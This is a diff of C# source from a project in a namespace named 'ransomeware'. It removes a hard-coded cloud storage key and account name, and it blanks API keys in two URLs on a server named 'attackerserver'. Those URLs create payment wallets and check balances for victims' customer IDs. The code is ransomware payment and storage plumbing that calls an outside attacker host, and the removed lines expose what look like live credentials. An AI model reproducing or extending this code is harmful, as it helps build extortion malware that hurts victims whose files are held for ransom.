@@ -62,8 +62,7 @@ namespace ransomeware
 
             string accountName = names[index];
             string key = keys[index];
-            //string key = "7QoqL8SbohqCUWZKjPVAlhJQmwdS1vfzJpa/cgOqLQL/2iXWZwNEQRHpXBiJSA2YDtkUi826ydkNLdWFJIg9ag==";
-            //string accountName = "checkprog";
+
 
             CloudStorageAccount storageAccount = Utils.Connect(accountName, key);
 
@@ -146,7 +145,7 @@ namespace ransomeware
         public static async Task<string> createWallet(string customerId)
         {
             //string url = "http://localhost:7071/api/AddWallet?id=" + customerId;
-            string url = "https://attackerserver.azurewebsites.net/api/AddWallet?code=IS8GU0ZrR3ZAl64xSfUuGGwK8iMFruhMf6zDkLSuQf9shjLTQrXdag==&id="
+            string url = "https://attackerserver.azurewebsites.net/api/AddWallet?code===&id="
                 + customerId;
             HttpClient client = new HttpClient();
             var response = await client.PostAsync(url, null);
@@ -165,7 +164,7 @@ namespace ransomeware
         public static async Task<double> getBalance(string customerId)
         {
             //string url = "http://localhost:7071/api/GetBalance?id=" + customerId;
-            string url = "https://attackerserver.azurewebsites.net/api/GetBalance?code=pcJWXNOkqEXiH86sN/imhs3BVXu78EFPUr28AiFdUH/zzWcArSjOpA==&id=" + customerId;
+            string url = "https://attackerserver.azurewebsites.net/api/GetBalance?code=&id=" + customerId;
             HttpClient client = new HttpClient();
             var response = await client.PostAsync(url, null);
             if (!response.IsSuccessStatusCode)
